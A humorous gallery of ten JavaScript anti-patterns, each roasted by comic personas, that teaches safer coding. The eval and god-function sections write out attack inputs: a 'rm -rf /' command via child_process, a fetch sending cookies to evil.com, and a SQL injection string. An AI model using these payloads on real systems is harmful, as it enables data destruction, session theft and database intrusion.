# JavaScript Sins 🔥

A gallery of JavaScript code crimes and the roasts they inspired.

---

## Sin #1: The `var` Pandemic

**The crime:**
```js
var userName = "alice";
var userName = "bob";
for (var i = 0; i < 10; i++) {
  var temp = i * 2;
}
console.log(i);     // 10 — leaks out of the loop
console.log(temp);  // 18 — also leaks
var userName = "charlie"; // redeclared, no warning, no problem, apparently
```

### 🧑‍🍳 Gordon Ramsay (savage)

`VAR`?! `VAR`?! It's 2026, you donkey! We've had `let` and `const` since 2015 — that's ELEVEN YEARS! That's longer than most MARRIAGES last! And here you are, still using `var` like it's a precious family heirloom passed down from your Netscape 4 days! You've redeclared `userName` THREE TIMES in the same scope and JavaScript didn't even blink! It just SHRUGGED and let you do it! That's not a feature, that's ENABLING!

And LOOK — LOOK! — your loop variable `i` is leaking out of the `for` loop like a BURST PIPE under the sink! `temp` is out there too, just WANDERING AROUND the function scope like a drunk chef stumbling out of the walk-in! `var` doesn't do block scoping, you muppet! It hoists to the top of the function like a BADLY RISEN SOUFFLÉ! Every single variable in this function is available EVERYWHERE and you can't even tell what was declared where! It's an ABOMINATION!

Fix it. `const` by default. `let` when you MUST mutate. `var` when you want me to come round your house and SMASH your keyboard with a rolling pin. GET IT OUT!

### 🎭 Shakespeare (medium)

O `var`, thou spectre of a bygone age!
Thrice hast thou named `userName` in this scope,
And thrice the interpreter said naught —
No warning raised, no error voiced, no shame.
'Tis not a language flaw; 'tis thy design,
For `var` forgives all sins, and that's the sin.

Behold! Poor `i`, released from out the loop,
Doth roam the function like a ghost unbound,
And `temp` — sweet `temp` — hath fled its nested home
To haunt the scope with value eighteen strong.
This is not closure; this is a PRISON BREAK,
Where variables flee the blocks that bore them.

Repent, good coder, and embrace `const`!
For `let` shall serve thee when mutation calls,
And `var` shall rest at last in its true grave —
The ECMAScript spec of nineteen ninety-nine.

---

## Sin #2: The `==` Coercion Lottery

**The crime:**
```js
if (userInput == 0) {
  console.log("empty!");
}
// Turns out: "" == 0 is true. " " == 0 is true. "0" == 0 is true.
// null == undefined is true. null == 0 is false.
// [] == 0 is true. [] == false is true. [] == ![] is ALSO true.
```

### 🐧 Linus Torvalds (savage)

The `==` operator in JavaScript is not equality. Let me repeat that, because people keep getting this wrong: it is not equality. It is a twelve-step algorithm from the spec that performs type coercion with rules that nobody has memorized, including the people who wrote the spec. When you write `userInput == 0`, you are not asking "is this zero." You are asking "when both sides are dragged through the ToPrimitive/ToNumber meat grinder, do they happen to end up equal." The answer is frequently yes for inputs that have nothing to do with zero.

Let's enumerate your code's failure modes, because apparently you have not. `"" == 0` is true, because the empty string coerces to zero. `" " == 0` is true, because whitespace-only strings coerce to zero. `"0" == 0` is true. `[] == 0` is true, because an empty array stringifies to `""` which coerces to zero. `[[]] == 0` is also true, for the same chain of reasons. Your "empty!" branch will fire for users who typed a space. It will fire for users who submitted an array. It will fire because Tuesday feels like it. This is not a check. This is a slot machine.

And the real damage is that `[] == ![]` is true. An array equals its own logical negation. If that does not make you reach for `===` immediately and set up an ESLint rule forbidding `==` forever, nothing will. Use `===`. Use `Number.isFinite`. Use a typed schema at the boundary. Stop pretending coercion is doing you a favor. It is not.

### 👵 Gentle Grandma (medium)

Oh honey, come sit down. I saw your `==` and I made some soup. No no, don't argue, come eat. I need to tell you about this one — and it's not your fault, dear, JavaScript is a very confusing language, my cousin Kevin works on TypeScript for exactly this reason.

So sweetheart, your little `if (userInput == 0)` — that's the DOUBLE equals — is asking a question with about twelve different answers. Did you know that the empty string `""` is considered equal to zero when you use `==`? It is! And `" "` — a single space — is ALSO equal to zero! And `"0"` the string, and `[]` the empty array, and `[[]]` the array containing an empty array, all equal zero! Your poor little "empty!" message is going to print for people who typed a SPACE, dear. A space! It's like inviting someone to dinner and they bring seventeen cousins.

The fix is just ONE more equals sign, bless your heart: `===`. Three of them, in a row, like a little fence. That one says "really, truly, no-coercion equal." And if you want to know if something is actually zero-ish from user input, wrap it in `Number()` first, or use `Number.isFinite`. Now eat your soup before it gets cold. And Kevin says to stop using `==`. He's been saying it for years. We all have.

---

## Sin #3: The Callback Pyramid of Doom

**The crime:**
```js
getUser(userId, function(err, user) {
  if (err) { console.log(err); return; }
  getOrders(user.id, function(err, orders) {
    if (err) { console.log(err); return; }
    getPayment(orders[0].id, function(err, payment) {
      if (err) { console.log(err); return; }
      sendReceipt(payment, function(err, result) {
        if (err) { console.log(err); return; }
        updateStats(user.id, function(err, stats) {
          if (err) { console.log(err); return; }
          console.log("done!");
        });
      });
    });
  });
});
```

### 🎭 Shakespeare (savage)

# THE TRAGEDIE OF THE INDENTED CALLBACK

### *A Soliloquy in the Key of Despair*

---

*[Enter our hero, a humble developer, bearing a function. It is deep. It is nested. It leans rightward, like a drunkard against a lamppost.]*

To nest, or not to nest — 'tis not a choice,
For thou hast nested, and the deed is done.
Behold! Six callbacks, each within the last,
A staircase to Gehenna wrought in braces,
Where every `function(err, x)` doth swear
That IT shall handle errors — but it lies!
For every `console.log(err); return;`
Is but a whispered funeral for data,
A silent burial, no stack, no trace.

*[The stage leans ever rightward. The actors cannot stand upright.]*

O wretched pyramid! Thy apex cries:
"Get user! Get orders! Get the payment next!
Then send receipt, THEN update the stats —
And only THEN, my lord, shalt thou behold
The promised land of `console.log("done!")`!"
But reach that land? Nay, thou shalt not —
For any callback may return a lie,
And thou shalt be left with orders for a ghost,
A payment for a user who ne'er existed,
And stats updated for a phantom ID.

*[The BARD gestures at the indentation.]*

Look thou upon this code, and look thou well —
Mine own `King Lear` hath fewer nested scenes!
The answer, mortal, is the humble `await`:
```
const user = await getUser(userId);
const orders = await getOrders(user.id);
```
FLAT as the Thames, READABLE as my sonnets,
With try/catch to ERROR like a man!

*[Exit, pursued by a linter.]*

### 🧑‍🍳 Gordon Ramsay (medium)

OH, what is THIS? It's a PYRAMID! You've built the Great Pyramid of Giza in JAVASCRIPT! Except instead of pharaohs, it's `function(err, user)` and it leans so far to the right I'm getting VERTIGO just LOOKING at it! Every level is another callback, and every callback has the SAME `if (err) { console.log(err); return; }` — you've COPY-PASTED error handling FIVE TIMES like you're paying per keystroke to NOT use async/await!

And the error handling itself — `console.log(err)` and return?! That's it?! You lose a payment and the response is a PRINTLN?! The customer never hears back, the receipt never sends, and somewhere a log file gets a sad little error message that NOBODY READS! It's 2026! We've had async/await since 2017! That's NINE YEARS! FLATTEN IT! `await`, `await`, `await`, one try/catch round the whole thing, DONE! Now get this pyramid out of my kitchen!

---

## Sin #4: Arrow Function `this` Hell

**The crime:**
```js
const button = {
  label: "Submit",
  init() {
    document.querySelector("#btn").addEventListener("click", function() {
      console.log(this.label); // undefined — `this` is the button element
    });
  },
  initArrow() {
    document.querySelector("#btn").addEventListener("click", () => {
      console.log(this.label); // "Submit" — arrow captures enclosing `this`
    });
  },
  brokenHandler: () => {
    console.log(this.label); // undefined — `this` is module scope, not `button`
  }
};
button.brokenHandler();
```

### 🐧 Linus Torvalds (medium)

The `this` keyword in JavaScript is the single most reliable way to tell whether a developer understands the language or just memorized patterns from a tutorial. Your code demonstrates the latter, comprehensively. You have managed to use three different `this` bindings across three functions in the same object literal, and the one you probably intended to work — `brokenHandler` — is the one that does not.

Regular function `this` is determined at call site. Arrow function `this` is captured lexically from the surrounding scope, at definition time, permanently. When you wrote `brokenHandler: () => ...`, you did not bind `this` to `button`. You bound it to whatever `this` happened to be where the object literal was defined — which, in a module, is either `undefined` in strict mode or the module object. So `this.label` is not "Submit." It is an error waiting to be printed.

The inconsistency is worse than either choice alone. Your `init` method uses a regular function as the event listener, so `this` is the DOM element and `this.label` is undefined. Your `initArrow` method uses an arrow function, so `this` is the `button` object and it works. Your `brokenHandler` is an arrow as an object method, which is always wrong. Three patterns, three different binding rules, one object. Pick one. Preferably: methods as shorthand (`method() {}`), and arrow functions for callbacks where you actually want to inherit `this`. And read the spec sections on `[[ThisMode]]`. Or just use classes and stop reinventing this.

### 👵 Gentle Grandma (gentle)

Oh dearie, `this` in JavaScript is the TRICKIEST little word in the whole language. I remember when I was first learning it — this was back at IBM, we were doing something in Java, which is a DIFFERENT language, honey, I know the names are confusing — and even there, `this` gave me a headache. So don't feel bad about this one, it trips everyone up.

Now, your `brokenHandler: () => { ... }` at the bottom, sweetheart — that arrow function is very modern, very fancy, but it does one thing that surprises people: it doesn't get its OWN `this`. It uses whatever `this` was OUTSIDE when you wrote it, which in a module file is usually `undefined` or some empty module thing. So when you call `button.brokenHandler()`, `this.label` is `undefined`, not "Submit." It's like setting the table in the kitchen and then wondering why there's no food in the dining room — the table didn't move, honey.

The rule of thumb, dear: use `method() {}` shorthand for object methods (that's what `init` does, very good!), and arrow functions `() => {}` for little callbacks where you WANT to keep the outside `this`. Your `initArrow` is actually perfect! See? You already know how. Now go write it the right way and come back for cookies. Kevin will be so proud.

---

## Sin #5: Monkey-Patching `Array.prototype`

**The crime:**
```js
Array.prototype.first = function() {
  return this[0];
};

Array.prototype.isEmpty = function() {
  return this.length === 0;
};

Object.prototype.clone = function() {
  return JSON.parse(JSON.stringify(this));
};

// Six months later, somewhere in the codebase:
for (let key in someObject) {
  console.log(key); // also prints "clone". Great.
}
```

### 🧑‍🍳 Gordon Ramsay (savage)

YOU'VE DONE WHAT?! You've added methods to `Array.prototype`?! To `OBJECT.PROTOTYPE`?! This is a SHARED KITCHEN, you MANIAC! Every single array in the entire program — every library, every dependency, every piece of code that will EVER run in this process — now has your `.first()` and your `.isEmpty()` bolted onto it like you RENOVATED the SPACE STATION while everyone was sleeping!

And `Object.prototype.clone`?! Are you TRYING to set the house on fire?! Every `for...in` loop in the ENTIRE CODEBASE now iterates over `clone`! Every library that forgot to use `hasOwnProperty` is now CRYING! Lodash is crying! jQuery is crying — and jQuery doesn't even cry, it just SILENTLY MISBEHAVES! Six months from now some poor sod is going to debug a "my object has a method I didn't define" bug for THREE DAYS before they find YOUR name in the git blame and come for you with a PITCHFORK!

`JSON.parse(JSON.stringify(this))` as a clone?! That loses functions, loses Dates, loses Maps, loses undefined, CHOKES on circular references, and you've mounted it on EVERY OBJECT IN THE UNIVERSE! Write a UTILITY FUNCTION, like a CIVILIZED HUMAN BEING! `function first(arr) { return arr[0] }` — DONE! Now REMOVE this from the prototype before I come round and remove YOU from the build!

### 🎭 Shakespeare (medium)

Hark! What hubris dost thou dare commit,
To mount thy methods on the sacred `prototype`?
`Array.prototype.first`! `Object.prototype.clone`!
Thou hast reached up to heaven's builtin realm
And carved thy name upon the firmament!

Now every `for...in` across this kingdom
Shall iterate thy `clone` as if 'twere data!
Each library that dwells within this scope
Shall find strange methods haunting every object,
Like Banquo's ghost at the iteration feast!

`JSON.parse(JSON.stringify(this))` —
A clone that loseth functions, Dates, and Maps,
And chokes on cycles like a stricken throat!
Mounted eternal on the Object throne!

Take heed: the `prototype` belongs to all.
Thy private methods in a module live,
Thy helpers in a `utils` file reside.
Touch not the sacred builtins — or the gods
Of downstream libraries shall curse thy name.

---

## Sin #6: `setTimeout(fn, 0)` as Async

**The crime:**
```js
function loadUser(id) {
  let user = null;
  fetch(`/api/user/${id}`).then(r => r.json()).then(u => { user = u; });
  setTimeout(() => {
    console.log(user.name); // works sometimes, crashes other times
  }, 0);
}

function forceRerender() {
  setState({ loading: true });
  setTimeout(() => {
    setState({ loading: false, data: fetchedData });
  }, 0); // "it doesn't work without this, idk why"
}
```

### 🐧 Linus Torvalds (savage)

`setTimeout(fn, 0)` is the JavaScript equivalent of closing your eyes and hoping the problem goes away. You have used it twice, in two different functions, for two different reasons, and in both cases you have misunderstood what it does. It does not wait zero milliseconds. It does not run immediately. It schedules a task on the macrotask queue, which runs after the current synchronous block AND after any pending microtasks — including the `.then` callbacks you are racing against.

In `loadUser`, you kicked off a `fetch`, which returns a promise, and then you used `setTimeout(..., 0)` to read the result. The `setTimeout` callback runs after the current call stack clears, but `fetch` resolves asynchronously over the network — that takes tens or hundreds of milliseconds. Your zero-delay timeout fires LONG before the fetch completes. `user` is null. `user.name` crashes. The fact that it "works sometimes" means your test environment is fast and your production environment will not be. This is not an async primitive. This is a race condition with a friendly face.

In `forceRerender`, you wrote "it doesn't work without this, idk why" in a comment. That comment is the single most honest thing in your codebase. The reason it "works" is that you are deferring the second `setState` until after React (or whatever framework) has flushed the first. If you need to sequence state updates, use the framework's actual API — `useEffect`, `queueMicrotask`, an actual promise chain, or just batched state. `setTimeout(..., 0)` is not a primitive for "later." It is a primitive for "after the macrotask queue," and using it as a synchronization tool tells every future maintainer that you did not understand the event loop. Read about microtasks versus macrotasks. It is one Wikipedia article. It will save you years.

### 👵 Gentle Grandma (medium)

Oh sweetheart, `setTimeout(fn, 0)` is my favorite JavaScript tell. When I see it in code, I know exactly what happened: someone had a bug, they wrapped the broken code in `setTimeout`, the bug seemed to go away, and they shipped it. It's okay honey, we've all done it. Kevin did it in 2011 and we still bring it up at Thanksgiving.

Your `loadUser` function, dear — you're kicking off a `fetch` which takes a little trip across the internet, and then you're asking `setTimeout` with zero milliseconds to read the result. But the fetch takes LONG milliseconds, maybe hundreds of them, and zero milliseconds is much shorter than that! So your little timeout fires first, `user` is still `null`, and then `user.name` explodes. It's like putting the turkey in the oven and checking if it's done zero seconds later. No, honey. The turkey is still frozen. Use `await`, dear — `const user = await (await fetch(...)).json();`. That actually WAITS for the turkey.

And the second one — `// "it doesn't work without this, idk why"` — oh, sweetie. That comment broke my heart a little bit. The answer to "idk why" is always "learn why, honey." If you need to sequence two state updates, your framework has a real tool for that — `useEffect`, a callback to `setState`, something. `setTimeout(fn, 0)` is a sleeping pill, not a cure. Now come eat, I made kugel.

---

## Sin #7: The `eval()` Horror

**The crime:**
```js
function calculate(userFormula) {
  return eval(userFormula);
}

function getConfig(key) {
  const config = loadConfigString(); // string from server
  return eval("config." + key);
}

// Called as: calculate(req.body.formula)
```

### 🧑‍🍳 Gordon Ramsay (savage)

`EVAL`?! `EVAL` OF `req.body.formula`?! You've opened the front door of your server, put up a SIGN that says "PLEASE COME IN AND RUN WHATEVER YOU WANT," and then you've gone to BED! You're taking a string from the internet — from ANYONE on the internet — and executing it as JAVASCRIPT! This isn't a bug, this is a FEATURE REQUEST from every script kiddie in a THIRTY-THOUSAND-MILE RADIUS!

Someone sends `calculate("require('child_process').exec('rm -rf /')")` and your server is GONE! Someone sends `calculate("fetch('http://evil.com?data=' + document.cookie)")` and every user's session is GONE! Someone sends the CONTENTS of `/etc/passwd` to their own server and you don't find out for SIX MONTHS when the bitcoin miner on your box starts making the fans SCREAM! This is RAW! THIS! IS! RAAAAWWWWW! Remote code execution served on a SILVER PLATTER with a little GARNISH of "oh but I needed to evaluate math expressions"!

And the SECOND one — `eval("config." + key)` — you're using `eval` to do a PROPERTY LOOKUP?! You know there's a thing called SQUARE BRACKETS, right?! `config[key]`! ONE character more than your abomination and it doesn't EXECUTE ARBITRARY CODE! For math, use a REAL expression parser — `mathjs`, `expr-eval`, LITERALLY ANY of them! `eval` is DEAD! `eval` has BEEN dead! Bury it, put a stake through its heart, and NEVER SPEAK ITS NAME IN MY KITCHEN AGAIN!

### 🎭 Shakespeare (medium)

*[Enter EVAL, cloaked in shadow, bearing a dagger behind its back]*

O thou, poor soul, who dost invite this wretch
Into thy server's warm and trusting halls!
`eval(userFormula)`! What formula, pray?
Whatever any stranger typeth in —
Be it `2 + 2`, or be it darker arts:
`require('child_process').exec('rm -rf /')`,
Or worse, a quiet exfiltration spell
That whispers cookies to some distant host.

Thou hast not written code — thou'st writ a door,
A door with neither lock nor chain nor guard,
Through which all malice freely may walk in
And make thy process its unwilling steed.

*[EVAL draws the dagger. The audience gasps.]*

And `eval("config." + key)` — O shame!
To summon demons for a property lookup!
When `config[key]` would do the self-same work
Without the risk of arbitrary execution!

Cast out this eval! Use a parser fit
For mathematical expressions — there are many.
And let the bracket notation serve thy lookups.
For `eval` is the devil's own invention,
And thou hast given it thy bank account.

---

## Sin #8: Untyped Everything (Implicit `any`)

**The crime:**
```js
// Large codebase, zero JSDoc, zero TypeScript, zero runtime validation.
function processOrder(order) {
  const total = order.items.reduce((sum, i) => sum + i.price * i.qty, 0);
  const discount = order.customer.tier === "gold" ? 0.1 : 0;
  const tax = total * order.region.taxRate;
  order.payment.charge(total - total * discount + tax);
  return { id: order.id, total, discount, tax };
}
```

### 🐧 Linus Torvalds (medium)

What is `order`. I do not mean that rhetorically. I mean it as a question you have refused to answer, for yourself or for anyone who has to maintain this. It has `items`, which has `price` and `qty`. It has `customer`, which has `tier`. It has `region`, which has `taxRate`. It has `payment`, which has a `charge` method. It has an `id`. That's six nested shapes and one method contract, all of which live entirely inside your head, and which will change as the code evolves without any mechanism to tell you which call sites break.

Every field access in this function is a trust fall. `order.items` — what if it's undefined? What if it's an empty array? What if `price` is a string like "9.99" because the API returned JSON with string decimals? Your `reduce` silently produces `"09.99" * quantity` and the total becomes `NaN`, which then goes into `charge()`, and you've just billed a customer `NaN` dollars. Does `charge()` validate? You do not know. Nobody knows.

The fix is either TypeScript with real interfaces — `interface Order { items: Array<{ price: number; qty: number }>; ... }` — or a runtime schema at the boundary (`zod`, `valibot`, anything). Probably both. "JavaScript is dynamic" is not an argument for writing code where the shape of your primary domain object is an oral tradition. Every `any` is a debugging session in your future. This function has approximately twelve of them.

### 👵 Gentle Grandma (gentle)

Oh honey, I love a clean function and this one looks so TIDY on the surface! `reduce`, nice little ternary, you pass the total along — it looks like a recipe, and I appreciate that. But dearie, let grandma ask you something. What IS an `order`? I mean, what does it LOOK like? If I handed you a stranger's order tomorrow, could you tell me whether `price` is a number or a string? Whether `items` could be empty? Whether `region.taxRate` is a decimal like `0.08` or a percent like `8`?

Because sweetheart, that's what your FUTURE SELF is going to ask at 2am when a customer gets charged `NaN` dollars. That happened to Kevin, bless him. He was VERY upset. The API started returning prices as strings one day — `"9.99"` instead of `9.99` — and suddenly `sum + "9.99" * 3` was doing string-ish math and totals went to `NaN`. The function didn't even CRASH, honey. It just quietly charged people nothing. For a week.

Try a little TypeScript, dear. Just a teeny bit. Or if that's too fancy, a `zod` schema at the top of the function: `const parsed = OrderSchema.parse(order)`. Then you KNOW what you've got. It's like checking the eggs before you crack them into the batter. A little effort now, no salmonella later.

---

## Sin #9: The 200-Line God Function

**The crime:**
```js
async function handleCheckout(req, res) {
  // validate input
  if (!req.body.email || !req.body.email.includes("@")) return res.status(400).send("bad email");
  if (!req.body.items || req.body.items.length === 0) return res.status(400).send("no items");
  // fetch user
  const user = await db.query("SELECT * FROM users WHERE email = '" + req.body.email + "'");
  // check inventory
  for (const item of req.body.items) { /* 30 lines */ }
  // calculate tax based on region
  let tax = 0;
  if (user.region === "US-CA") tax = 0.0725; /* 40 more if/else branches */
  // apply discount codes
  /* 25 lines of discount logic */
  // charge payment
  /* 30 lines of Stripe interaction */
  // send confirmation email
  /* 20 lines of email templating */
  // update analytics
  /* 15 lines of event tracking */
  // log the order
  /* 10 lines of logging */
  // respond
  res.json({ ok: true });
}
```

### 🧑‍🍳 Gordon Ramsay (savage)

WHAT. IS. THIS. ONE FUNCTION?! TWO HUNDRED LINES?! You've built a TOWER OF BABEL in a single Express handler! Validation! Database queries! Inventory checks! FORTY tax branches! Discount logic! STRIPE! Email templating! Analytics! Logging! Response! This isn't a function, this is a MEDIEVAL BANQUET and you're serving it on ONE PLATE!

And in the middle — oh, BEAUTIFUL — `db.query("SELECT * FROM users WHERE email = '" + req.body.email + "'")`?! SQL INJECTION served HOT AND FRESH! I send you an email of `' OR '1'='1` and I'm suddenly CUSTOMER NUMBER ONE in your system! This isn't just a god function, it's a god function with a LOADED GUN taped to it! You can't even refactor this safely because you don't know what depends on what! If the tax calculation throws, did the inventory decrement? Did the email send? WHO KNOWS! NOBODY KNOWS! The function certainly doesn't — it just keeps GOING!

Break. It. UP! `validateCheckout`. `fetchUser` — with PARAMETERIZED queries, you absolute PLUMBER! `reserveInventory`. `calculateTax` — preferably with a LOOKUP TABLE instead of forty `if` statements! `applyDiscount`. `chargePayment`. `sendConfirmation`. `trackEvent`. Each one a small, testable, named piece of WORK! Your handler should be FIFTEEN LINES that READ like an ORDER TICKET! Now get this monstrosity out of my kitchen before I put it in the BIN!

### 🎭 Shakespeare (savage)

# THE TRAGEDIE OF `handleCheckout`

### *Being a Chronicle of Ambition Most Unchecked, in Two Hundred Lines of One Function*

---

**ACT I — THE AMBITION**

*[Enter HANDLE_CHECKOUT, bearing the entire commerce of the realm upon its solitary shoulders.]*

Some men are born to greatness, others thrust —
But THOU wast born to do ALL THINGS at once!
Validation, fetching, inventory,
Taxation, discount, payment, email, stats —
Did Atlas bear the heavens with less strain?
Did Sisyphus push BOULDERS of such weight?

---

**ACT II — THE INJECTION**

*[A mysterious STRANGER approaches with an email of most peculiar character: `' OR '1'='1`]*

Behold! The stranger sends a single quote!
And thou hast templated it INTO thy query!
"SELECT * FROM users WHERE email = '" + evil + "'" —
The walls are breached, the database exposed!
All rows returned! All secrets known! All lost!
`?` parameters would have saved thy soul —
One character would stand 'twixt thee and ruin.

---

**ACT III — THE FORTY BRANCHES**

*[A corridor. Forty DOORS line the walls, each labeled with a tax region.]*

If-else, if-else, if-else, if-else — FORTY!
Each rate a magic number, hardcoded,
No table, no map, no lookup by key!
When California changeth her tax rate,
Thou must descend through forty tombs of code
To find and edit ONE magical constant.

---

**ACT IV — THE IMPOSSIBILITY OF TESTING**

*[The BARD holds up a test file. It is blank. It has always been blank. It will always be blank.]*

How shall a man write tests for this behemoth?
To test the tax, he must also mock Stripe,
And email, and inventory, and the DB,
And analytics, and logs, and req, and res —
Ten mocks to test one branch! No soul shall write them.
Thus bugs shall breed unchecked, like rats in walls.

---

**ACT V — THE REFACTORING**

*[The BARD steps forward with a chisel and a pile of small, well-named functions.]*

Extract! Extract! `validateCheckout` speak!
Let `fetchUser` take a PARAMETERIZED query!
Let `calculateTax` consult a lookup map!
Let `chargePayment`, `sendReceipt`, `trackEvent`
Each stand alone, each tested, each PURE.
And let thy handler be a short, clear script —
A conductor, not a one-man orchestra.

*[Exeunt, carrying 185 extracted lines to their new modules.]*

---

## Sin #10: The Silent `try/catch` Muffler

**The crime:**
```js
async function saveUserProfile(data) {
  try {
    const validated = validateProfile(data);
    const saved = await db.profiles.update(validated);
    await cache.invalidate(data.userId);
    await analytics.track("profile_updated", { userId: data.userId });
    return saved;
  } catch (e) {
    // something went wrong
  }
}

// Called as:
const result = await saveUserProfile(formData);
if (result) { showSuccess(); } else { showSuccess(); } // always shows success
```

### 👵 Gentle Grandma (savage)

Oh, sweetheart. Oh, honey. Come here. Sit down. Put the laptop on the table. No, further away. There we go.

I need you to look at this `catch` block with me. Do you see it? `// something went wrong`. That's the comment. That's the ENTIRE body of the catch. A little comment, no logger, no rethrow, no nothing. Just a tiny silent shrug. Dear, that's not error handling. That's a cover-up. That's what I used to do at IBM when I burned the cookies for the office party — I'd throw them out and pretend nobody asked for cookies. Except YOU are throwing out your USERS' DATA.

Let me tell you what happens, pumpkin. Your validator throws because someone's profile has a weird character. Your catch swallows it. Your function returns `undefined`. The caller checks `if (result)` — which is falsy — and then because both branches of your `if/else` call `showSuccess()` (oh, honey, that's a separate conversation, we'll get to it), the user sees "Saved!" and walks away HAPPY. Their data was NEVER SAVED. The cache wasn't invalidated. The analytics event didn't fire. And six months later customer support gets a ticket that says "I updated my address three months ago and you still shipped to the old one" and NOBODY CAN FIND THE BUG because your catch block MURDERED the evidence.

You know who does this, dear? Kevin does this. My cousin Kevin. He once caught an entire OutOfMemoryError in Java and logged nothing — his server ran for four days before it fell over and took down the building's badge system with it. They had to evacuate. Because of Kevin. Because of `catch { // something went wrong }`.

Here is what grandma wants to see. `catch (e) { logger.error("saveUserProfile failed", { userId: data.userId, error: e }); throw e; }`. Log it with CONTEXT so you know which user. RETHROW so the caller actually knows it failed. Let the caller decide whether to show an error — and PLEASE, dear, fix that `if/else` so the two branches actually DO different things. I'm going to make tea. When I come back I want to see that catch block have some SELF-RESPECT. Go on.

### 🐧 Linus Torvalds (medium)

This catch block is a lie. It tells every caller — every one — that this function cannot fail. That is false. The function can fail in at least five distinct ways: validation throws, the DB update rejects, the cache invalidation rejects, the analytics call rejects, or any of them throws a synchronous error that the async wrapper turns into a rejection. Every one of those is a distinct failure mode with distinct recovery semantics, and you have flattened them all to `undefined` with a comment that says "something went wrong." The comment is the only accurate thing in the block.

The downstream damage is worse than the lost information. Your caller's `if (result) { showSuccess(); } else { showSuccess(); }` — and yes, I noticed both branches — means that the UI reports success unconditionally. The user's profile update silently fails. The user goes on with their day believing their data is persisted. It is not. Your cache is stale. Your analytics event is missing. Your DB rolled back or didn't. You don't know which, because you threw away the error. This is not resilient code. This is a data-corruption generator with a friendly face.

Fix: narrow what you catch, or do not catch at all. If you have specific exceptions you know how to handle — a duplicate-key error, a validation error — catch those specifically and return a typed result. For everything else, let it propagate. Log with structured context at the boundary (`{ userId, operation, error }`) and rethrow, or translate to a typed error the caller can actually distinguish. "Catch all, ignore, return undefined" is not error handling. It is deletion of evidence.

---

*End of gallery. Twenty roasts. Zero fixes applied. Your move.*
